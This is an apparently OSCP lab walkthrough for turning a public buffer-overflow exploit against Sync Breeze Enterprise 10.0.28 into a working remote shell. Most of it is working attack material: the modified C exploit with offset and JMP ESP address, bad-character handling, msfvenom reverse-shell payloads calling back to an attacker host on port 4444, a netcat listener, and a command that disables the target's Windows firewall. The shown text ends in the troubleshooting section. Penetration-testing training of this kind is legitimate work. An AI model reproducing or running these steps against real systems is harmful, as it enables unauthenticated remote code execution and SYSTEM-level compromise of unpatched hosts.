# SyncBreeze 10.0.28 Buffer Overflow - Complete Detailed Walkthrough

## Table of Contents

1. [Environment & Setup](#environment--setup)
2. [Web Exploit Considerations (OSCP 14.2.1)](#web-exploit-considerations)
3. [Exploit Analysis](#exploit-analysis)
4. [Cross-Compilation Process](#cross-compilation-process)
5. [Exploit Modification Phase](#exploit-modification-phase)
6. [Debugging & Troubleshooting](#debugging--troubleshooting)
7. [Successful Exploitation](#successful-exploitation)
8. [Complete Troubleshooting Guide](#complete-troubleshooting-guide)
9. [Commands Reference](#commands-reference)
10. [OSCP Exam Notes](#oscp-exam-notes)
11. [Lessons Learned](#lessons-learned)

---

## Environment & Setup

### Lab Information

**Target System**:
- IP Address: 192.168.165.10
- Operating System: Windows 10 (Version 10.0.16299.15)
- Vulnerable Service: Sync Breeze Enterprise 10.0.28
- Service Port: 80 (HTTP)
- Vulnerability: Stack-based Buffer Overflow in POST /login

**Attack System**:
- IP Address: 192.168.45.160 (tun0 - VPN interface)
- Operating System: Kali Linux 2025
- Tools Required: mingw-w64, msfvenom, wine, nc, Wireshark

### Network Verification

Before beginning exploitation, verify network connectivity:

```bash
# Check your VPN IP
ip a | grep "inet 192.168.45"
# Output: inet 192.168.45.160/24 scope global tun0

# Test connectivity to target
ping -c 1 192.168.165.10
# Should receive ICMP reply

# Verify service is running
nmap -p 80 192.168.165.10 -Pn
# Expected: 80/tcp open http
```

**Why This Matters**:
- Wrong IP in shellcode = connection failure
- Service not running = exploit won't reach target
- Firewall blocking = no ICMP/service detection

---

## Web Exploit Considerations

### Understanding Web-Based Buffer Overflows (OSCP 14.2.1)

Before modifying any web exploit, we must understand the key considerations that differentiate web exploits from local binary exploits.

#### **Critical Questions for Web Exploit Modification**

**1. Does it initiate an HTTP or HTTPS connection?**

Our exploit uses HTTP (port 80):
```c
server.sin_port = htons(80);
```

**Implications**:
- HTTP = plaintext, easy to debug with Wireshark
- HTTPS would require SSL/TLS handling
- Self-signed certificates can break HTTPS exploits
- May need to disable certificate verification

**For SyncBreeze**: HTTP on port 80 (no SSL complications).

---

**2. Does it access a specific web application path or route?**

Yes, the exploit targets `/login`:
```c
char request_one[] = "POST /login HTTP/1.1\r\n"
```

**Implications**:
- Default installation path may differ
- Application might be installed under subdirectory (e.g., `/syncbreeze/login`)
- Must verify actual path before running exploit
- Check with: `curl -I http://192.168.165.10/login`

**For SyncBreeze**: Default path `/login` was correct.

---

**3. Does the exploit leverage a pre-authentication vulnerability?**

Yes, this is a pre-authentication exploit:
- No login credentials required
- Vulnerability triggers before authentication check
- POST to `/login` with malicious username parameter
- Most dangerous type (unauthenticated RCE)

**Advantages**:
- No need to find/crack credentials
- Exploit works immediately
- Typical of default installations

---

**4. If not, how does the exploit authenticate to the web application?**

N/A for this exploit (pre-auth).

**If authentication were required, check for**:
- Hardcoded credentials in exploit
- Session token management
- Cookie handling
- CSRF token requirements
- Multi-step authentication flows

---

**5. How are GET or POST requests crafted?**

This exploit uses **POST** request with specific structure:

```http
POST /login HTTP/1.1
Host: 192.168.165.10
User-Agent: Mozilla/5.0...
Accept: text/html,application/xhtml+xml...
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.165.10/login
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: [calculated]

username=[BUFFER_OVERFLOW]&password=A
```

**Critical Components**:

**a) Content-Type**:
```c
"Content-Type: application/x-www-form-urlencoded\r\n"
```
- Tells server how to parse POST body
- Wrong Content-Type = server might not parse parameters
- Standard for HTML form submissions

**b) Content-Length**:
```c
int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
```
- **MUST match actual POST body length**
- Too short = truncated buffer (exploit fails)
- Too long = server waits for more data (timeout)
- Calculated dynamically in exploit

**c) POST Body**:
```
username=[780_As][RETURN_ADDRESS][NOPS][SHELLCODE]&password=A
```
- URL-encoded parameters
- `&` separates parameters (is a **bad character**)
- `=` assigns values (is a **bad character**)
- Must account for these in shellcode

---

**6. Does it rely on default application settings?**

Yes, this exploit assumes:
- **Port 80** (default HTTP port)
- **Path `/login`** (default login endpoint)
- **No authentication** required to reach login page
- **No rate limiting** on login attempts

**If defaults changed**:
```bash
# Find actual port
nmap -p- 192.168.165.10 --min-rate 1000

# Find actual login path
gobuster dir -u http://192.168.165.10 -w /usr/share/wordlists/dirb/common.txt

# Test accessibility
curl -v http://192.168.165.10/login
```

**For SyncBreeze**: All defaults were standard.

---

**7. Will oddities like self-signed certificates disrupt the exploit?**

Not applicable (HTTP not HTTPS).

**If HTTPS were used**:
```python
# Python exploits might need:
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

# Or:
requests.post(url, verify=False)
```

---

**8. Additional Protections (Out of Scope for Public Exploits)**

Public exploits generally do **NOT** account for:

**a) Web Application Firewalls (WAF)**:
- ModSecurity, Cloudflare, etc.
- Block common attack patterns
- Require evasion techniques (encoding, case variation)

**b) .htaccess Restrictions**:
- IP whitelisting
- Authentication requirements
- Request rate limiting

**c) Reverse Proxies**:
- nginx, Apache front-end
- May modify headers
- Can change Content-Length

**d) Load Balancers**:
- Distribute traffic across multiple servers
- Exploit may only hit one instance
- Session persistence issues

**For SyncBreeze**: None of these present in lab environment.

---

### SyncBreeze Web Exploit Analysis Summary

| Consideration | SyncBreeze Status |
|---------------|-------------------|
| **Protocol** | HTTP (port 80) |
| **Target Path** | /login (default) |
| **Authentication** | Pre-auth (none required) |
| **HTTP Method** | POST |
| **Content-Type** | application/x-www-form-urlencoded |
| **Content-Length** | Dynamically calculated |
| **Bad Characters** | \x00 \x0a \x0d \x25 \x26 \x2b \x3d |
| **Default Settings** | Uses all defaults |
| **SSL Issues** | None (HTTP) |
| **WAF/Protections** | None in lab |

---

## Exploit Analysis

### Step 1: Locating the Exploit

**Command**:
```bash
searchsploit "Sync Breeze Enterprise 10.0.28"
```

**Output**:
```
Exploit Title                                      |  Path
-------------------------------------------------- ---------------------------------
Sync Breeze Enterprise 10.0.28 - Denial of Service | windows/dos/43200.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow | windows/remote/42928.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC) | windows/dos/42341.c
```

**Analysis**:

1. **43200.py - DoS**: Causes application crash only, no exploitation
   - Avoid DoS exploits unless no alternative exists
   - No code execution capability

2. **42928.py - Remote Buffer Overflow (Python)**:
   - Verified exploit (EDB Verified badge)
   - Python script (requires Python on attack machine)
   - Easier to read and understand
   - Great for reference (return address, offset, bad chars)

3. **42341.c - Remote Buffer Overflow (C)**:
   - Compiled binary (standalone executable)
   - Can run with Wine on Kali
   - Demonstrates cross-compilation
   - More complex to modify (string handling)

**Decision**: Use **42341.c** to learn cross-compilation skills.

---

**Copying Exploit**:
```bash
searchsploit -m 42341
# Copies to: /home/kali/OSCP/capstones/chapter_13_PUBLIC_EXPLOITS_lab_4/42341.c
```

**Flags Explained**:
- `-m`: Mirror/copy exploit to current directory
- `42341`: Exploit DB ID number

---

### Step 2: Reading the Exploit Code

**Open for analysis**:
```bash
cat 42341.c
```

**Key Sections Identified**:

**a) Headers (Lines 6-12)**:
```c
#include <winsock2.h>
#include <windows.h>
```
- Windows-specific headers
- **Indicates**: Must compile for Windows target
- Requires Windows sockets library (winsock2)

**b) Socket Configuration (Lines 36-38)**:
```c
server.sin_addr.s_addr = inet_addr("172.16.116.222");
server.sin_family = AF_INET;
server.sin_port = htons(8080);
```
- **IP**: 172.16.116.222 (author's test environment)
- **Port**: 8080 (author's test port)
- **MUST CHANGE**: Both to match our target

**c) HTTP Headers (Lines 59-67)**:
```c
char request_one[] = "POST /login HTTP/1.1\r\n"
                    "Host: 172.16.116.222\r\n"
                    ...
                    "Referer: http://172.16.116.222/login\r\n"
```
- **Host header**: Must match target IP
- **Referer**: Should match target URL
- **Content-Type**: application/x-www-form-urlencoded (correct for our vuln)

**d) Buffer Configuration (Line 70)**:
```c
int initial_buffer_size = 780;
```
- **Offset to EIP**: 780 bytes
- This is where we overwrite the return address
- Verified in Python exploit (line 50): `"A" * 780`

**e) Return Address (Line 74)**:
```c
unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
```
- **Address**: 0x735275cb (little-endian: \xcb\x75\x52\x73)
- **Module**: msvbvm60.dll (Visual Basic 6.0 runtime)
- **Problem**: This DLL may not exist on target
- **MUST CHANGE**: Use verified address from Python exploit

**f) Shellcode (Lines 76-101)**:
```c
unsigned char shellcode[] =
    "\x90\x90\x90\x90..." // NOP SLIDE
    "\xdb\xda\xbd\x92..." // Encoded payload
```
- **NOP sled**: 15 bytes of \x90 (landing pad)
- **Shellcode**: Hex-encoded (unknown payload)
- **Security Risk**: Never run unknown shellcode
- **MUST CHANGE**: Generate our own payload

---

## Cross-Compilation Process

### Step 3: Installing the Cross-Compiler

**Why Cross-Compile?**

We have:
- Kali Linux (attack platform)
- Windows executable required (target platform)

Options:
1. âŒ Move to Windows and compile there (requires Windows dev environment)
2. âŒ Rewrite in Python (time-consuming)
3. âœ… **Cross-compile** on Kali using mingw-w64

**Installation**:
```bash
sudo apt update
sudo apt install mingw-w64 -y
```

**What this installs**:
- `i686-w64-mingw32-gcc`: 32-bit Windows C compiler
- `x86_64-w64-mingw32-gcc`: 64-bit Windows C compiler
- Windows runtime libraries
- Cross-compilation toolchain

**Verification**:
```bash
i686-w64-mingw32-gcc --version
```

**Expected Output**:
```
i686-w64-mingw32-gcc (GCC) 10.2.1 20210110
```

---

### Step 4: Initial Compilation Attempt

**First Attempt**:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

**Result**: âŒ FAILURE

**Error Output**:
```
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x146): undefined reference to `_imp__htons@4'
...
collect2: error: ld returned 1 exit status
```

**Error Analysis**:

**undefined reference to `_imp__WSAStartup`**:
- `WSAStartup`: Windows Sockets initialization function
- `_imp__`: Import from external library
- **Means**: Compiler can't find the Windows Sockets library

**Other undefined references**:
- `socket`: Create network socket
- `inet_addr`: Convert IP string to binary
- `htons`: Host to Network Short (byte order)
- `connect`: Establish TCP connection
- `send`: Send data over socket

**All these are in**: ws2_32.dll (Windows Sockets 2 32-bit)

---

**Researching the Error**:
```bash
# Google search: "mingw WSAStartup undefined reference"
# Result: Need to link ws2_32 library with -lws2_32 flag
```

**Understanding Library Linking**:
- `-l`: Link library flag
- `ws2_32`: Library name (ws2_32.dll)
- Linker searches for libws2_32.a or ws2_32.lib

---

**Corrected Compilation**:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

**Flag Breakdown**:
- `i686-w64-mingw32-gcc`: Cross-compiler for 32-bit Windows
- `42341.c`: Source code file
- `-o syncbreeze_exploit.exe`: Output filename
- `-lws2_32`: Link Windows Sockets library

**Result**: âœ… SUCCESS

**Verification**:
```bash
ls -lah syncbreeze_exploit.exe
file syncbreeze_exploit.exe
```

**Output**:
```
-rwxr-xr-x 1 kali kali 355K syncbreeze_exploit.exe
syncbreeze_exploit.exe: PE32 executable (console) Intel 80386, for MS Windows
```

**Analysis**:
- PE32: Portable Executable 32-bit
- Intel 80386: 32-bit x86 architecture
- for MS Windows: Target platform

**Compilation successful!** âœ…

---

## Exploit Modification Phase

### Step 5: Modifying Target IP and Port

**Three Locations Require IP Address Changes**:

**Location 1: Socket Connection (Line 36)**

**Original**:
```c
server.sin_addr.s_addr = inet_addr("172.16.116.222");
```

**Modified**:
```c
server.sin_addr.s_addr = inet_addr("192.168.165.10");
```

**Function Explanation**:
- `inet_addr()`: Converts string IP ("192.168.165.10") to 32-bit binary network format
- `sin_addr.s_addr`: Structure member holding IP address
- This is where the socket actually connects

---

**Location 2: HTTP Host Header (Line 60)**

**Original**:
```c
"Host: 172.16.116.222\r\n"
```

**Modified**:
```c
"Host: 192.168.165.10\r\n"
```

**Why This Matters**:
- HTTP 1.1 requires Host header
- Virtual hosting: Multiple sites on same IP
- Server uses Host header to route request
- Mismatch can cause request rejection

---

**Location 3: HTTP Referer Header (Line 64)**

**Original**:
```c
"Referer: http://172.16.116.222/login\r\n"
```

**Modified**:
```c
"Referer: http://192.168.165.10/login\r\n"
```

**Why This Matters**:
- Indicates which page sent the user to login
- Some applications check Referer for CSRF protection
- Should match expected origin

---

**Port Modification (Line 38)**

**Original**:
```c
server.sin_port = htons(8080);
```

**Modified**:
```c
server.sin_port = htons(80);
```

**Function Explanation**:
- `htons()`: Host to Network Short
- Converts port number to network byte order (big-endian)
- **Why needed**: Network protocols use big-endian, Intel CPUs use little-endian

**Example**:
```
Port 80 in decimal = 0x0050 in hex
Host byte order (little-endian): 50 00
Network byte order (big-endian): 00 50 â† htons() does this
```

---

### Step 6: Updating the Return Address

**Problem**: Original return address points to msvbvm60.dll which doesn't exist on target.

**Finding Correct Return Address**:

**Method 1: Check Python Exploit** (Fastest)

```bash
searchsploit -m 42928
grep -i "jmp\|0x10" 42928.py
```

**Output** (Line 15):
```python
# jmp = 10 09 0c 83 libspp.dll
```

**Analysis**:
- Address: 0x10090c83
- Instruction: JMP ESP
- Module: libspp.dll (part of SyncBreeze application)
- Status: EDB Verified (trusted)

---

**Understanding JMP ESP**:

**Purpose**: Redirect execution to stack where our shellcode is

**Exploit Flow**:
```
1. Buffer overflow overwrites return address with 0x10090c83
2. Function returns, loads 0x10090c83 into EIP
3. CPU executes instruction at 0x10090c83
4. Instruction is: JMP ESP (jump to stack pointer)
5. ESP points to our NOP sled + shellcode
6. Execution slides through NOPs into shellcode
7. Shellcode executes â†’ Reverse shell!
```

**Memory Layout**:
```
Stack Growth (low â†’ high addresses)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Local Variables & Buffer       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ [780 bytes of 'A']            â”‚ â† Padding
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ [0x10090c83]                  â”‚ â† Return Address (JMP ESP)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ [90 90 90 90...] NOP sled     â”‚ â† ESP points here after JMP ESP
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ [Shellcode]                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**Little-Endian Conversion**:

**Address**: 0x10090c83

**How to convert to little-endian**:
```
Address:     10 09 0c 83
Reverse:     83 0c 09 10
As bytes:    \x83\x0c\x09\x10
```

**Why reverse?**
- Intel x86 CPUs are little-endian
- Least significant byte stored first
- Network protocols are big-endian
- This is for memory storage, not network transmission

---

**Updating Code (Line 74)**:

**Original**:
```c
unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
```

**Modified**:
```c
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83 JMP ESP at libspp.dll
```

**Verification Method** (If Needed):

Using Immunity Debugger on Windows:
```
1. Attach to syncbrs process
2. View > Executable Modules (Alt+E)
3. Double-click libspp.dll
4. Right-click in disassembly > Search for > Command
5. Type: JMP ESP
6. Press Enter
7. Verify address: 0x10090c83
```

---

### Step 7: Generating Custom Shellcode

**Why Generate Our Own?**

**Security Reasons**:
- Unknown payload could be malicious
- May contain backdoors
- Could target unintended systems

**Practical Reasons**:
- Need our IP address in payload
- Need our listener port
- Original may have wrong EXITFUNC

---

**Bad Characters Analysis**:

From Python exploit (line 16):
```python
# bad char = 00 0A 0D 25 26 2B 3D
```

**Why These Are Bad**:

| Byte | Character | Why Bad | Effect |
|------|-----------|---------|--------|
| `\x00` | NULL | String terminator | Truncates buffer |
| `\x0a` | Line Feed (LF) | HTTP line ending | Breaks HTTP parsing |
| `\x0d` | Carriage Return (CR) | HTTP line ending | Breaks HTTP parsing |
| `\x25` | % | URL encoding prefix | %20 becomes space |
| `\x26` | & | HTTP parameter separator | username=A&password=B |
| `\x2b` | + | URL encoding for space | Becomes space character |
| `\x3d` | = | HTTP parameter assignment | key=value separator |

**Example of Bad Character Corruption**:

**If shellcode contains `\x26` (ampersand)**:
```
Original POST body:
username=AAAA\x26BBBBCCCC&password=A

HTTP parser sees:
username=AAAA
[NEW PARAMETER] BBBBCCCC
password=A

Result: Shellcode truncated at \x26
```

---

**Generating Payload - Attempt 1**:

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.191 \
  LPORT=443 \
  EXITFUNC=thread \
  -f c \
  -b "\x00\x0a\x0d\x25\x26\x2b\x3d" \
  --platform windows \
  -a x86
```

**Parameter Breakdown**:

- `-p windows/shell_reverse_tcp`: Payload type (reverse TCP shell for Windows)
- `LHOST=192.168.45.191`: **Attacker IP** (where shell connects back to)
- `LPORT=443`: **Listener port** on attacker machine
- `EXITFUNC=thread`: Exit via thread (clean exit, doesn't crash app)
- `-f c`: Output format as C byte array (char array)
- `-b "..."`: Bad characters to exclude from payload
- `--platform windows`: Target operating system
- `-a x86`: Architecture (32-bit)

**Why EXITFUNC=thread?**
```c
// Without EXITFUNC=thread:
exploit â†’ shellcode executes â†’ exits via process termination â†’ app crashes

// With EXITFUNC=thread:
exploit â†’ shellcode executes â†’ exits via thread termination â†’ app continues running
```

**Output**:
```c
unsigned char buf[] =
"\xbd\x91\xee\x12\xec\xda\xd4\xd9..."
// 351 bytes
```

**Problem**: We used IP 192.168.45.191 (didn't verify our actual IP!)

---

**Discovering IP Mismatch**:

```bash
ip a | grep "inet 192.168.45"
```

**Output**:
```
inet 192.168.45.160/24 scope global tun0
```

**Realization**: Our IP is `.160` not `.191`!

**Impact**: Shellcode will try to connect to wrong IP â†’ Connection fails

---

**Corrected Payload Generation**:

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.160 \
  LPORT=443 \
  EXITFUNC=thread \
  -f c \
  -b "\x00" \
  --platform windows \
  -a x86
```

**Note**: Simplified bad char list to test

**Replacing in Code (Line 76)**:

**Delete old shellcode**, **insert new**:
```c
unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xd9\xc8\xba\x9f\x17\x5d\xcf\xd9\x74\x24\xf4\x5b\x31\xc9"
    // ... (paste msfvenom output)
```

**Keep the NOP sled** (15 bytes of `\x90`) before shellcode!

---

## Debugging & Troubleshooting

### Step 8: The NULL Terminator Problem

**Recompile and test**:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

**Setup Immunity Debugger** (on Windows):
```
1. Open as Administrator
2. File > Attach > syncbrs
3. Ctrl+G â†’ Type: 10090c83
4. F2 (set breakpoint) â†’ F9 (run)
```

**Run exploit** (on Kali):
```bash
sudo wine syncbreeze_exploit.exe
```

**Result**: Application crashes but EIP = `0x9010090c` âŒ

**Expected**: EIP = `0x10090c83`

---

**Analysis**:

**EIP Value**: 0x9010090c

**Breaking it down**:
```
Expected: 10 09 0c 83
Actual:   90 10 09 0c

Observation: Shifted right by 1 byte!
```

**Diagnosis**: **Off-by-one error** in buffer offset

---

**Understanding the Problem**:

**Look at buffer allocation** (Lines 70-73):
```c
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```

**What this does**:

**Step 1: Allocate 780 bytes**
```c
malloc(780) â†’ reserves 780 bytes
```

**Step 2: Fill with 'A' (0x41)**
```c
memset(padding, 0x41, 780) â†’ all 780 bytes = 'A'
```

**Memory**:
```
Position: 0   1   2   ... 778 779
Content: [A] [A] [A] ... [A] [A]
```

**Step 3: Set last byte to NULL**
```c
memset(padding + 779, 0x00, 1) â†’ position 779 = '\x00'
```

**Memory**:
```
Position: 0   1   2   ... 778  779
Content: [A] [A] [A] ... [A] [\x00]
```

---

**The Problem with strcat()**:

Later in code (Lines 112-117):
```c
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);  // â† THE PROBLEM
strcat(buffer, retn);
strcat(buffer, shellcode);
```

**How strcat() works**:
```c
// strcat() copies source to destination until it finds '\x00'
// It DOES NOT copy the '\x00' itself
```

**Result**:
```
Allocated: 780 bytes total
NULL at: Position 779
strcat() copies: Positions 0-778 (779 bytes)
                 Stops at position 779 (doesn't copy the NULL)

Actual A's copied: 779 (not 780!)
```

---

**Visual Representation**:

**What we wanted**:
```
[780 A's] + [Return Addr] + [Shellcode]
```

**What we got**:
```
[779 A's] + [Return Addr] + [Shellcode]
           â†‘
      1 byte short!
```

**Effect on Return Address**:
```
Expected position: Byte 780
Actual position: Byte 779
Result: Return address misaligned by 1 byte
```

---

**The Fix**:

**Change allocation size from 780 to 781** (Line 70):

**Before**:
```c
int initial_buffer_size = 780;
```

**After**:
```c
int initial_buffer_size = 781;
```

**Why this works**:
```
Allocate: 781 bytes
Fill with A: All 781 = 'A'
Set position 780 to NULL: position 780 = '\x00'

strcat() copies: Positions 0-779 (780 bytes)
Result: 780 A's copied âœ…
```

**Memory Layout (Corrected)**:
```
Position: 0   1   2   ... 778 779  780
Content: [A] [A] [A] ... [A] [A] [\x00]
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              780 bytes

strcat() copies 780 A's (stops at position 780)
Return address now at correct offset!
```

---

**Understanding the Math**:

```
Allocated bytes: 781
Usable A's: 780 (position 780 is NULL terminator)
strcat() behavior: Copies until '\x00', doesn't copy the '\x00'
Result: 780 A's in final buffer
```

**This is a common C programming gotcha!**

---

### Step 9: Shellcode Corruption - Access Violation FFFFFFFD

**After fixing NULL terminator issue**:

**Recompile**:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

**Test in Immunity Debugger**:
```
1. Set breakpoint at 0x10090c83
2. Run exploit
3. Breakpoint hit! âœ…
4. Press F9 to continue...
5. CRASH: Access violation when writing to [FFFFFFFD]
```

**Error Analysis**:

**FFFFFFFD in hexadecimal**:
```
FFFFFFFD = -3 in signed 32-bit integer
```

**This is an INVALID memory address**

**What this means**:
- Shellcode started executing
- Decoder stub ran
- Tried to write to address 0xFFFFFFFD
- Invalid address â†’ Access Violation

---

**Verifying Shellcode Arrived Intact**:

**In Immunity Debugger** (when paused at JMP ESP):
```
1. Look at ESP register value (e.g., 0x01CA745C)
2. Right-click ESP â†’ Follow in Dump
3. Check bytes at ESP
```

**What we saw**:
```
01CA745C  90 90 90 90 90 90 90 90  â† NOP sled âœ…
01CA7464  90 90 90 D9 C8 BA 9F 17  â† Shellcode starts (D9 C8 BA...) âœ…
```

**Shellcode arrived intact!** So why did it crash?

---

**Understanding Shellcode Encoding**:

**Structure**:
```
[Decoder Stub] + [Encoded Payload]
```

**How it works**:
```
1. Decoder stub executes first
2. Decodes the payload in memory
3. Jumps to decoded payload
4. Decoded payload executes (our shell)
```

**When bad characters corrupt shellcode**:
```
Decoder stub gets corrupted
    â†“
Produces garbage instructions
    â†“
Garbage tries to access invalid memory (FFFFFFFD)
    â†“
Access Violation
```

---

**Root Cause**:

Even though we excluded known bad characters, the **encoded payload itself** contains a bad character we didn't account for.

**Why this happens**:
```
Port 443 encoded â†’ produces bytes X Y Z
Byte Y happens to be a bad character
Application corrupts byte Y
Decoder produces garbage
Crash
```

---

**The Solution**: Change the port number

**Why this works**:
```
Port 443 â†’ Encoder produces bytes with bad char
Port 4444 â†’ Encoder produces different bytes, hopefully no bad chars
```

**This is trial and error**, but often works!

---

**Generating New Payload**:

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.45.160 \
  LPORT=4444 \
  EXITFUNC=thread \
  -f c \
  -b "\x00\x0a\x0d\x25\x26\x2b\x3d" \
  -e x86/shikata_ga_nai \
  --platform windows \
  -a x86
```

**Changes**:
- `LPORT=4444` (was 443)
- `-e x86/shikata_ga_nai` (explicit encoder)
- All bad chars back in exclusion list

**Encoder Explanation**:

**shikata_ga_nai** (ä»•æ–¹ãŒãªã„ = "it cannot be helped" in Japanese):
- Polymorphic encoder
- Creates different decoder stub each time
- Very good at avoiding bad characters
- Industry standard for msfvenom

---

**Update Exploit**:

Replace shellcode array (Line 76) with new msfvenom output:
```c
unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xbf\xaa\x18\x28\xe4\xdb\xcd\xd9..." // New payload
```

**Update listener**:
```bash
# Kill old listener on 443
pkill -f "nc -nvlp 443"

# Start new listener on 4444
nc -nvlp 4444
```

---

## Successful Exploitation

### Step 10: Windows Firewall

**Critical Step**: Disable Windows Firewall on target

**Why needed**:
```
Exploit executes â†’ Shellcode runs â†’ Tries to connect to 192.168.45.160:4444
                                              â†“
                                    Windows Firewall blocks outbound connection
                                              â†“
                                         Connection fails
```

**On Windows VM** (PowerShell as Administrator):
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Parameter Breakdown**:
- `Set-NetFirewallProfile`: Configure firewall settings
- `-Profile Domain,Public,Private`: All network profiles
- `-Enabled False`: Disable firewall

**Verification**:
```powershell
Get-NetFirewallProfile | Select Name, Enabled
```

**Expected Output**:
```
Name    Enabled
----    -------
Domain  False
Private False
Public  False
```

---

### Step 11: Final Exploit Execution

**Setup** (Kali):
```bash
# Terminal 1: Listener
nc -nvlp 4444

# Terminal 2: Exploit
sudo wine syncbreeze_exploit.exe
```

**Expected Output** (Exploit):
```
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
```

**Expected Output** (Listener):
```
listening on [any] 4444 ...
connect to [192.168.45.160] from (UNKNOWN) [192.168.165.10] 49708
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

**SUCCESS!** ðŸŽ‰

**Shell Details**:
- **Source**: 192.168.165.10:49708 (target)
- **Destination**: 192.168.45.160:4444 (attacker)
- **Privilege Level**: SYSTEM (highest privilege)
- **Working Directory**: C:\Windows\system32

---

### Step 12: Shell Verification

**Commands to verify**:
```cmd
whoami
# Output: nt authority\system

hostname
# Output: [target hostname]

ipconfig
# Verify 192.168.165.10

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# OS Name: Microsoft Windows 10 Pro
# OS Version: 10.0.16299 N/A Build 16299
```

---

## Complete Troubleshooting Guide

### Issue 1: Wine kernel32.dll Error

**Symptom**:
```
wine: could not load kernel32.dll, status c0000135
```

**Cause**: Wine not configured for 32-bit or running as wrong user

**Solutions**:

**A) Use sudo**:
```bash
sudo wine syncbreeze_exploit.exe
# User vs root Wine configurations are separate
```

**B) Reinitialize Wine** (if sudo doesn't work):
```bash
rm -rf ~/.wine
WINEARCH=win32 winecfg  # Click OK when window appears
wine syncbreeze_exploit.exe
```

---

### Issue 2: Compilation Errors

**Symptom**:
```
undefined reference to `_imp__WSAStartup@8'
```

**Cause**: Missing Windows Sockets library

**Solution**:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
#                                                        ^^^^^^^^
#                                                 Add this flag!
```

---

### Issue 3: EIP Contains Wrong Value

| EIP Value | Meaning | Solution |
|-----------|---------|----------|
| `41414141` | All A's | Offset too small, increase buffer_size |
| `10090c83` | Correct! | âœ… Return address is right |
| `9010090c` | Off by 1 byte | Fix NULL terminator (buffer_size = 781) |
| `0c091083` | Backwards | Use little-endian `\x83\x0c\x09\x10` |
| Random | Wrong address | Find correct JMP ESP address |

---

### Issue 4: Connection Refused / No Shell

**Diagnostic Checklist**:

**A) Verify Kali IP**:
```bash
ip a | grep "inet 192.168.45"
# Ensure shellcode LHOST matches this IP
```

**B) Verify listener running**:
```bash
ss -tlnp | grep 4444
# Should show nc listening on port 4444
```

**C) Verify firewall disabled** (Windows):
```powershell
Get-NetFirewallProfile | Select Name, Enabled
# All should be False
```

**D) Test connectivity** (Windows â†’ Kali):
```powershell
Test-NetConnection -ComputerName 192.168.45.160 -Port 4444
# Should succeed
```

---

### Issue 5: Access Violation FFFFFFFD

**Symptom**: Debugger shows shellcode execution â†’ crash at invalid address

**Cause**: Bad characters corrupted shellcode decoder

**Solutions**:

**A) Try different port**:
```bash
# Port 443 â†’ Bad chars
# Port 4444 â†’ Might work
